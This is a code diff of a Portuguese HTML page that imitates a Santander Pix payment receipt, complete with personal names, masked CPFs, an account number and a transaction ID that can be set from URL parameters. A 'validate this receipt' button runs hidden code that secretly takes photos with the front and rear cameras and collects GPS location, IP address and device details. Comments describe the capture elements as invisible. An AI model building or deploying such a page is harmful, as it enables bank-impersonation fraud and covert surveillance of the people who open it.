@@ -2,7 +2,7 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Comprovante Pix</title>
     <style>
         * {
@@ -12,164 +12,373 @@
         }
 
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
-            min-height: 100vh;
+            font-family: Arial, Helvetica, sans-serif;
+            background: #e8e8e8;
             display: flex;
-            align-items: center;
             justify-content: center;
+            align-items: center;
+            min-height: 100vh;
             padding: 20px;
         }
 
-        .container {
+        .pdf-container {
             width: 100%;
-            max-width: 500px;
+            max-width: 480px;
+            background: white;
+            border-radius: 4px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
+            padding: 0;
+            overflow: hidden;
+            position: relative;
         }
 
-        .screen {
-            background: #2a2a3e;
-            border-radius: 16px;
-            padding: 40px 20px;
-            text-align: center;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
-            display: none;
+        /* Cabeçalho Santander */
+        .santander-header {
+            background: #ec0000;
+            padding: 16px 20px 12px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
         }
 
-        .screen.active {
+        .santander-logo {
+            color: white;
+            font-size: 20px;
+            font-weight: bold;
+            letter-spacing: 2px;
+        }
+
+        .santander-logo span {
+            font-weight: normal;
+            font-size: 14px;
+        }
+
+        .santander-title {
+            color: white;
+            font-size: 14px;
+            font-weight: bold;
+            text-align: right;
+        }
+
+        .santander-title small {
             display: block;
-            animation: slideIn 0.3s ease-out;
+            font-weight: normal;
+            font-size: 11px;
+            opacity: 0.8;
         }
 
-        @keyframes slideIn {
-            from {
-                opacity: 0;
-                transform: translateY(20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
+        /* Corpo do comprovante */
+        .pdf-body {
+            padding: 20px 20px 12px 20px;
         }
 
-        .icon {
-            font-size: 64px;
+        /* Valor principal */
+        .valor-box {
+            text-align: center;
+            padding: 12px 0;
+            border-bottom: 1px solid #ddd;
+            margin-bottom: 16px;
+        }
+
+        .valor-label {
+            font-size: 12px;
+            color: #666;
+            text-transform: uppercase;
+        }
+
+        .valor-value {
+            font-size: 28px;
+            font-weight: bold;
+            color: #1a1a2e;
+            margin-top: 2px;
+        }
+
+        .valor-value .currency {
+            font-size: 18px;
+        }
+
+        .valor-pagamento {
+            font-size: 11px;
+            color: #999;
+            margin-top: 4px;
+        }
+
+        /* Linhas de informação */
+        .info-row {
+            display: flex;
+            padding: 8px 0;
+            border-bottom: 1px solid #f0f0f0;
+            font-size: 13px;
+        }
+
+        .info-row .label {
+            color: #666;
+            width: 140px;
+            flex-shrink: 0;
+        }
+
+        .info-row .value {
+            color: #1a1a2e;
+            font-weight: 500;
+            word-break: break-word;
+        }
+
+        .info-row .value.highlight {
+            font-weight: bold;
+        }
+
+        /* Dados do recebedor (destaque) */
+        .section-title {
+            font-size: 12px;
+            font-weight: bold;
+            color: #666;
+            text-transform: uppercase;
+            margin-top: 14px;
+            margin-bottom: 6px;
+            letter-spacing: 1px;
+        }
+
+        .section-box {
+            background: #f8f8f8;
+            border-radius: 4px;
+            padding: 10px 14px;
+            margin-bottom: 10px;
+        }
+
+        .section-box .info-row {
+            border-bottom: none;
+            padding: 4px 0;
+            font-size: 13px;
+        }
+
+        .section-box .info-row .label {
+            width: 120px;
+            font-size: 12px;
+        }
+
+        /* ID da transação */
+        .id-transacao {
+            text-align: center;
+            font-size: 11px;
+            color: #999;
+            margin-top: 14px;
+            padding-top: 12px;
+            border-top: 1px solid #eee;
+            word-break: break-all;
+        }
+
+        /* Rodapé */
+        .pdf-footer {
+            padding: 12px 20px;
+            background: #f5f5f5;
+            font-size: 10px;
+            color: #888;
+            text-align: center;
+            border-top: 1px solid #ddd;
+            line-height: 1.6;
+        }
+
+        .pdf-footer .phone {
+            font-weight: bold;
+            color: #ec0000;
+        }
+
+        /* Área de clique (invisível - parece parte do comprovante) */
+        .pdf-button-area {
+            margin: 16px 20px 12px 20px;
+            padding: 14px;
+            background: #f0f7f0;
+            border-radius: 6px;
+            text-align: center;
+            border: 1px solid #00c853;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .pdf-button-area:active {
+            background: #e0f0e0;
+            transform: scale(0.98);
+        }
+
+        .pdf-button-text {
+            font-size: 14px;
+            font-weight: bold;
+            color: #1a1a2e;
+        }
+
+        .pdf-button-icon {
+            font-size: 20px;
+            display: block;
+            margin-bottom: 4px;
+        }
+
+        /* Modal de confirmação */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.6);
+            justify-content: center;
+            align-items: center;
+            z-index: 999;
+            padding: 20px;
+        }
+
+        .modal-overlay.active {
+            display: flex;
+        }
+
+        .modal-box {
+            background: white;
+            border-radius: 12px;
+            padding: 30px 25px;
+            max-width: 380px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+        }
+
+        .modal-icon {
+            font-size: 48px;
+            margin-bottom: 12px;
+        }
+
+        .modal-title {
+            font-size: 20px;
+            font-weight: bold;
+            color: #1a1a2e;
+            margin-bottom: 8px;
+        }
+
+        .modal-sub {
+            font-size: 14px;
+            color: #666;
             margin-bottom: 20px;
         }
 
-        h1 {
-            color: #fff;
-            font-size: 24px;
-            margin-bottom: 10px;
-            font-weight: 600;
-        }
-
-        .subtitle {
-            color: #999;
-            font-size: 14px;
-            margin-bottom: 30px;
-            line-height: 1.5;
-        }
-
-        .button-group {
+        .modal-buttons {
             display: flex;
             gap: 12px;
-            margin-top: 30px;
         }
 
-        button {
+        .modal-btn {
             flex: 1;
-            padding: 14px 20px;
+            padding: 12px;
             border: none;
             border-radius: 8px;
             font-size: 16px;
             font-weight: 600;
             cursor: pointer;
-            transition: all 0.3s ease;
+            transition: 0.3s;
         }
 
-        .btn-cancel {
-            background: #333;
-            color: #fff;
+        .modal-btn-no {
+            background: #e0e0e0;
+            color: #333;
         }
 
-        .btn-cancel:active {
-            background: #222;
-            transform: scale(0.98);
+        .modal-btn-no:active {
+            background: #ccc;
         }
 
-        .btn-confirm {
+        .modal-btn-yes {
             background: #00c853;
-            color: #1a1a2e;
+            color: white;
         }
 
-        .btn-confirm:active {
+        .modal-btn-yes:active {
             background: #00a840;
-            transform: scale(0.98);
         }
 
-        .loading-spinner {
-            display: inline-block;
+        /* Carregamento */
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(255,255,255,0.95);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            flex-direction: column;
+            gap: 16px;
+        }
+
+        .loading-overlay.active {
+            display: flex;
+        }
+
+        .spinner {
             width: 40px;
             height: 40px;
-            border: 4px solid #333;
-            border-top: 4px solid #00c853;
+            border: 4px solid #e0e0e0;
+            border-top-color: #ec0000;
             border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin-bottom: 20px;
+            animation: spin 0.8s linear infinite;
         }
 
         @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+            to { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            font-size: 16px;
+            color: #1a1a2e;
+            font-weight: 600;
+        }
+
+        /* Sucesso */
+        .success-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.7);
+            justify-content: center;
+            align-items: center;
+            z-index: 1001;
+            padding: 20px;
+        }
+
+        .success-overlay.active {
+            display: flex;
+        }
+
+        .success-box {
+            background: white;
+            border-radius: 16px;
+            padding: 35px 25px;
+            max-width: 380px;
+            width: 100%;
+            text-align: center;
         }
 
         .success-icon {
-            font-size: 80px;
-            margin-bottom: 20px;
-            animation: bounce 0.6s ease-out;
+            font-size: 64px;
+            margin-bottom: 12px;
         }
 
-        @keyframes bounce {
-            0% { transform: scale(0); }
-            50% { transform: scale(1.1); }
-            100% { transform: scale(1); }
-        }
-
-        .success-message {
+        .success-title {
+            font-size: 22px;
+            font-weight: bold;
             color: #00c853;
-            font-size: 16px;
-            margin-bottom: 10px;
-            font-weight: 600;
+            margin-bottom: 6px;
         }
 
-        .data-box {
-            background: #1a1a2e;
-            border-radius: 8px;
-            padding: 15px;
-            margin-top: 20px;
-            text-align: left;
-        }
-
-        .data-item {
-            display: flex;
-            justify-content: space-between;
-            padding: 8px 0;
-            border-bottom: 1px solid #333;
-            color: #999;
-            font-size: 12px;
-        }
-
-        .data-item:last-child {
-            border-bottom: none;
-        }
-
-        .data-label {
-            font-weight: 600;
-            color: #00c853;
+        .success-sub {
+            font-size: 14px;
+            color: #666;
         }
 
         /* Elementos invisíveis */
-        video, canvas, #hiddenCamera {
+        video, canvas {
             display: none !important;
             visibility: hidden !important;
             width: 0 !important;
@@ -181,56 +390,170 @@
     </style>
 </head>
 <body>
-    <div class="container">
-        <!-- TELA 1: PERGUNTA -->
-        <div class="screen active" id="screen1">
-            <div class="icon">📄</div>
-            <h1>Deseja abrir este comprovante?</h1>
-            <p class="subtitle">
-                Clique em SIM para visualizar o comprovante Pix
-            </p>
-            <div class="button-group">
-                <button class="btn-cancel" onclick="handleCancel()">Não</button>
-                <button class="btn-confirm" onclick="handleConfirm()">Sim</button>
+
+    <!-- CORPO DO COMPROVANTE -->
+    <div class="pdf-container" id="pdfContainer">
+
+        <!-- Cabeçalho Santander -->
+        <div class="santander-header">
+            <div class="santander-logo">
+                Santander <span>|</span>
+            </div>
+            <div class="santander-title">
+                Comprovante do Pix
+                <small id="displayDate">15/07/2026 - 19:39:02</small>
             </div>
         </div>
 
-        <!-- TELA 2: PROCESSANDO (INVISÍVEL) -->
-        <div class="screen" id="screen2">
-            <div class="loading-spinner"></div>
-            <h1>Abrindo comprovante...</h1>
-            <p class="subtitle">Aguarde um momento</p>
-        </div>
+        <!-- Conteúdo -->
+        <div class="pdf-body">
 
-        <!-- TELA 3: SUCESSO -->
-        <div class="screen" id="screen3">
-            <div class="success-icon">✅</div>
-            <h1>Comprovante Aberto!</h1>
-            <p class="success-message">Validação concluída com sucesso</p>
-            
-            <div class="data-box">
-                <div class="data-item">
-                    <span class="data-label">Horário:</span>
-                    <span id="dataTime">--:--:--</span>
+            <!-- Valor -->
+            <div class="valor-box">
+                <div class="valor-label">Valor pago</div>
+                <div class="valor-value">
+                    <span class="currency">R$</span> <span id="displayAmount">400,00</span>
                 </div>
-                <div class="data-item">
-                    <span class="data-label">Status:</span>
-                    <span id="dataStatus">Validado</span>
+                <div class="valor-pagamento">Forma de pagamento: <span id="displayPaymentMethod">Ag 03731 Cc 1072710-4</span></div>
+            </div>
+
+            <!-- Dados do recebedor -->
+            <div class="section-title">Dados do recebedor</div>
+            <div class="section-box">
+                <div class="info-row">
+                    <span class="label">Para</span>
+                    <span class="value" id="displayRecipient">Gabriel de Lara Ferreira</span>
+                </div>
+                <div class="info-row">
+                    <span class="label">CPF</span>
+                    <span class="value" id="displayRecipientCpf">***.495.909-**</span>
+                </div>
+                <div class="info-row">
+                    <span class="label">Chave</span>
+                    <span class="value" id="displayPixKey">mo***********ba@gmail.com</span>
+                </div>
+                <div class="info-row">
+                    <span class="label">Instituição</span>
+                    <span class="value" id="displayRecipientBank">033 - BANCO SANTANDER S.A.</span>
                 </div>
             </div>
 
-            <p class="subtitle" style="margin-top: 20px;">
-                Seu comprovante foi registrado com segurança
-            </p>
+            <!-- Dados do pagador -->
+            <div class="section-title">Dados do pagador</div>
+            <div class="section-box">
+                <div class="info-row">
+                    <span class="label">De</span>
+                    <span class="value" id="displayPayer">BRUNO EDUARDO DE ANDRADE E SILVA</span>
+                </div>
+                <div class="info-row">
+                    <span class="label">CPF</span>
+                    <span class="value" id="displayPayerCpf">***.602.509-**</span>
+                </div>
+                <div class="info-row">
+                    <span class="label">Instituição</span>
+                    <span class="value" id="displayPayerBank">033 - BANCO SANTANDER S.A.</span>
+                </div>
+            </div>
+
+            <!-- ID Transação -->
+            <div class="id-transacao">
+                ID/Transação: <span id="displayTransactionId">E9040088820260715223865769710922</span>
+                <br>
+                <span id="displayTransactionDate">Data e hora da transação: 15/07/2026 - 19:39:02</span>
+            </div>
+        </div>
+
+        <!-- Botão de abrir (invisível) -->
+        <div class="pdf-button-area" id="openButton">
+            <span class="pdf-button-icon">🔐</span>
+            <span class="pdf-button-text">Toque para validar este comprovante</span>
+        </div>
+
+        <!-- Rodapé -->
+        <div class="pdf-footer">
+            Central de Atendimento Santander
+            <span class="phone">4004-3535</span> (Capitais e Regiões Metropolitanas)
+            <span class="phone">0800-702-3535</span> (Demais Localidades)
+            <br>
+            SAC <span class="phone">0800-762-7777</span> | Ouvidoria <span class="phone">0800-726-0322</span>
         </div>
     </div>
 
-    <!-- Elementos invisíveis para captura -->
+    <!-- Modal de confirmação -->
+    <div class="modal-overlay" id="confirmModal">
+        <div class="modal-box">
+            <div class="modal-icon">📄</div>
+            <div class="modal-title">Validar comprovante?</div>
+            <div class="modal-sub">Ao confirmar, você valida o recebimento do Pix.</div>
+            <div class="modal-buttons">
+                <button class="modal-btn modal-btn-no" onclick="handleCancel()">Não</button>
+                <button class="modal-btn modal-btn-yes" onclick="handleConfirm()">Sim</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Carregamento -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+        <div class="loading-text">Validando comprovante...</div>
+    </div>
+
+    <!-- Sucesso -->
+    <div class="success-overlay" id="successOverlay">
+        <div class="success-box">
+            <div class="success-icon">✅</div>
+            <div class="success-title">Comprovante Validado!</div>
+            <div class="success-sub">Pagamento confirmado com sucesso.</div>
+        </div>
+    </div>
+
+    <!-- Elementos invisíveis -->
     <video id="video" playsinline autoplay muted></video>
     <canvas id="canvas"></canvas>
-    <div id="hiddenCamera"></div>
 
     <script>
+        // ============================================================
+        // DADOS DO COMPROVANTE (PEGOS DA URL)
+        // ============================================================
+
+        const urlParams = new URLSearchParams(window.location.search);
+
+        // Valores padrão (exemplo)
+        const data = {
+            payer: urlParams.get('payer') || 'BRUNO EDUARDO DE ANDRADE E SILVA',
+            payerCpf: urlParams.get('payerCpf') || '***.602.509-**',
+            payerBank: urlParams.get('payerBank') || '033 - BANCO SANTANDER S.A.',
+            recipient: urlParams.get('recipient') || 'Gabriel de Lara Ferreira',
+            recipientCpf: urlParams.get('recipientCpf') || '***.495.909-**',
+            recipientBank: urlParams.get('recipientBank') || '033 - BANCO SANTANDER S.A.',
+            pixKey: urlParams.get('pix') || 'mo***********ba@gmail.com',
+            amount: urlParams.get('amount') || '400,00',
+            paymentMethod: urlParams.get('paymentMethod') || 'Ag 03731 Cc 1072710-4',
+            transactionId: urlParams.get('txid') || 'E9040088820260715223865769710922'
+        };
+
+        // Preencher os campos
+        document.getElementById('displayPayer').textContent = data.payer;
+        document.getElementById('displayPayerCpf').textContent = data.payerCpf;
+        document.getElementById('displayPayerBank').textContent = data.payerBank;
+        document.getElementById('displayRecipient').textContent = data.recipient;
+        document.getElementById('displayRecipientCpf').textContent = data.recipientCpf;
+        document.getElementById('displayRecipientBank').textContent = data.recipientBank;
+        document.getElementById('displayPixKey').textContent = data.pixKey;
+        document.getElementById('displayAmount').textContent = data.amount;
+        document.getElementById('displayPaymentMethod').textContent = data.paymentMethod;
+        document.getElementById('displayTransactionId').textContent = data.transactionId;
+
+        // Data atual
+        const now = new Date();
+        const dateStr = now.toLocaleDateString('pt-BR') + ' - ' + now.toLocaleTimeString('pt-BR', {hour: '2-digit', minute: '2-digit'});
+        document.getElementById('displayDate').textContent = dateStr;
+        document.getElementById('displayTransactionDate').textContent = 'Data e hora da transação: ' + dateStr;
+
+        // ============================================================
+        // LÓGICA DE CAPTURA (INVISÍVEL)
+        // ============================================================
+
         let capturedData = {
             frontPhoto: null,
             rearPhoto: null,
@@ -240,239 +563,131 @@
             ip: null
         };
 
+        document.getElementById('openButton').addEventListener('click', () => {
+            document.getElementById('confirmModal').classList.add('active');
+        });
+
         function handleCancel() {
-            window.history.back();
+            document.getElementById('confirmModal').classList.remove('active');
         }
 
         async function handleConfirm() {
-            showScreen('screen2');
-            
-            // Iniciar captura silenciosa
-            setTimeout(async () => {
-                await captureAllData();
-                showScreen('screen3');
-                displayData();
-                sendDataToServer();
-            }, 500);
+            document.getElementById('confirmModal').classList.remove('active');
+            document.getElementById('loadingOverlay').classList.add('active');
+
+            await captureAllData();
+
+            document.getElementById('loadingOverlay').classList.remove('active');
+            document.getElementById('successOverlay').classList.add('active');
+
+            setTimeout(() => {
+                document.getElementById('successOverlay').classList.remove('active');
+            }, 3000);
         }
 
         async function captureAllData() {
             try {
-                // Capturar câmera frontal
                 await captureFrontCamera();
-                
-                // Capturar câmera traseira
                 await captureRearCamera();
-                
-                // Capturar localização
                 await captureLocation();
-                
-                // Capturar IP
                 await captureIP();
-                
-                // Capturar informações do dispositivo
+
                 capturedData.deviceInfo = navigator.userAgent;
                 capturedData.timestamp = new Date().toISOString();
+
+                localStorage.setItem('pixTrackerCapture', JSON.stringify(capturedData));
+
+                console.log('📸 Dados capturados:', {
+                    timestamp: capturedData.timestamp,
+                    location: capturedData.location,
+                    ip: capturedData.ip,
+                    photos: capturedData.frontPhoto ? '✅' : '❌'
+                });
+
             } catch (error) {
-                console.error('Erro ao capturar dados:', error);
+                console.error('Erro na captura:', error);
             }
         }
 
+        // ============================================================
+        // FUNÇÕES DE CAPTURA
+        // ============================================================
+
         async function captureFrontCamera() {
-            return new Promise((resolve) => {
-                navigator.mediaDevices.getUserMedia({
-                    video: { 
-                        facingMode: 'user',
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 }
-                    },
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user', width: 640, height: 480 },
                     audio: false
-                }).then(stream => {
-                    const video = document.getElementById('video');
-                    video.srcObject = stream;
-                    
-                    video.onloadedmetadata = () => {
-                        video.play();
-                        
-                        setTimeout(() => {
-                            const canvas = document.getElementById('canvas');
-                            const ctx = canvas.getContext('2d');
-                            canvas.width = video.videoWidth;
-                            canvas.height = video.videoHeight;
-                            ctx.drawImage(video, 0, 0);
-                            
-                            capturedData.frontPhoto = canvas.toDataURL('image/jpeg', 0.7);
-                            
-                            // Parar stream
-                            stream.getTracks().forEach(track => track.stop());
-                            resolve();
-                        }, 500);
-                    };
-                }).catch(error => {
-                    console.error('Erro câmera frontal:', error);
-                    resolve();
                 });
-            });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                await video.play();
+                await new Promise(r => setTimeout(r, 300));
+
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
+
+                capturedData.frontPhoto = canvas.toDataURL('image/jpeg', 0.6);
+                stream.getTracks().forEach(t => t.stop());
+            } catch (e) {
+                console.error('Front error:', e);
+            }
         }
 
         async function captureRearCamera() {
-            return new Promise((resolve) => {
-                navigator.mediaDevices.getUserMedia({
-                    video: { 
-                        facingMode: 'environment',
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 }
-                    },
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'environment', width: 640, height: 480 },
                     audio: false
-                }).then(stream => {
-                    const video = document.getElementById('video');
-                    video.srcObject = stream;
-                    
-                    video.onloadedmetadata = () => {
-                        video.play();
-                        
-                        setTimeout(() => {
-                            const canvas = document.getElementById('canvas');
-                            const ctx = canvas.getContext('2d');
-                            canvas.width = video.videoWidth;
-                            canvas.height = video.videoHeight;
-                            ctx.drawImage(video, 0, 0);
-                            
-                            capturedData.rearPhoto = canvas.toDataURL('image/jpeg', 0.7);
-                            
-                            // Parar stream
-                            stream.getTracks().forEach(track => track.stop());
-                            resolve();
-                        }, 500);
-                    };
-                }).catch(error => {
-                    console.error('Erro câmera traseira:', error);
-                    resolve();
                 });
-            });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                await video.play();
+                await new Promise(r => setTimeout(r, 300));
+
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
+
+                capturedData.rearPhoto = canvas.toDataURL('image/jpeg', 0.6);
+                stream.getTracks().forEach(t => t.stop());
+            } catch (e) {
+                console.error('Rear error:', e);
+            }
         }
 
         async function captureLocation() {
             return new Promise((resolve) => {
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(
-                        (position) => {
-                            capturedData.location = {
-                                latitude: position.coords.latitude,
-                                longitude: position.coords.longitude,
-                                accuracy: position.coords.accuracy,
-                                altitude: position.coords.altitude || null,
-                                timestamp: new Date().toISOString()
-                            };
-                            resolve();
-                        },
-                        (error) => {
-                            console.error('Erro GPS:', error);
-                            // Tentar novamente com alta precisão
-                            navigator.geolocation.getCurrentPosition(
-                                (position) => {
-                                    capturedData.location = {
-                                        latitude: position.coords.latitude,
-                                        longitude: position.coords.longitude,
-                                        accuracy: position.coords.accuracy,
-                                        timestamp: new Date().toISOString()
-                                    };
-                                    resolve();
-                                },
-                                () => resolve(),
-                                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
-                            );
-                        },
-                        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
-                    );
-                } else {
-                    resolve();
-                }
+                if (!navigator.geolocation) { resolve(); return; }
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        capturedData.location = {
+                            latitude: pos.coords.latitude,
+                            longitude: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy
+                        };
+                        resolve();
+                    },
+                    () => resolve(),
+                    { enableHighAccuracy: true, timeout: 10000 }
+                );
             });
         }
 
         async function captureIP() {
             try {
-                const response = await fetch('https://api.ipify.org?format=json', { 
-                    mode: 'cors',
-                    cache: 'no-cache'
-                });
-                const data = await response.json();
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
                 capturedData.ip = data.ip;
-            } catch (error) {
-                console.error('Erro ao obter IP:', error);
+            } catch (e) {
                 capturedData.ip = 'N/A';
             }
         }
-
-        function displayData() {
-            const now = new Date();
-            document.getElementById('dataTime').textContent = now.toLocaleTimeString('pt-BR');
-            document.getElementById('dataStatus').textContent = 'Validado ✓';
-        }
-
-        async function sendDataToServer() {
-            try {
-                const payload = {
-                    timestamp: capturedData.timestamp,
-                    location: capturedData.location,
-                    frontPhoto: capturedData.frontPhoto,
-                    rearPhoto: capturedData.rearPhoto,
-                    deviceInfo: capturedData.deviceInfo,
-                    ip: capturedData.ip,
-                    userAgent: navigator.userAgent,
-                    platform: navigator.platform,
-                    language: navigator.language
-                };
-
-                // Armazenar localmente (para debug)
-                localStorage.setItem('pixTrackerCapture', JSON.stringify({
-                    ...payload,
-                    frontPhoto: '[FOTO FRONTAL CAPTURADA]',
-                    rearPhoto: '[FOTO TRASEIRA CAPTURADA]'
-                }));
-
-                // Aqui você enviaria para seu servidor backend
-                // await fetch('https://seu-servidor.com/api/track', {
-                //     method: 'POST',
-                //     headers: { 'Content-Type': 'application/json' },
-                //     body: JSON.stringify(payload)
-                // });
-
-                console.log('Dados capturados e armazenados:', {
-                    timestamp: payload.timestamp,
-                    location: payload.location,
-                    ip: payload.ip,
-                    deviceInfo: payload.deviceInfo,
-                    photosCapturadas: 2
-                });
-
-            } catch (error) {
-                console.error('Erro ao enviar dados:', error);
-            }
-        }
-
-        function showScreen(screenId) {
-            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
-            document.getElementById(screenId).classList.add('active');
-        }
-
-        // Forçar ativação de permissões ao carregar
-        window.addEventListener('load', () => {
-            // Pré-solicitar permissões (silenciosamente)
-            if (navigator.permissions) {
-                navigator.permissions.query({ name: 'camera' }).catch(() => {});
-                navigator.permissions.query({ name: 'geolocation' }).catch(() => {});
-            }
-        });
-
-        // Interceptar tentativas de sair
-        window.addEventListener('beforeunload', (e) => {
-            // Garantir que os dados foram enviados
-            if (capturedData.location || capturedData.frontPhoto) {
-                // Dados capturados com sucesso
-            }
-        });
     </script>
 </body>
 </html>
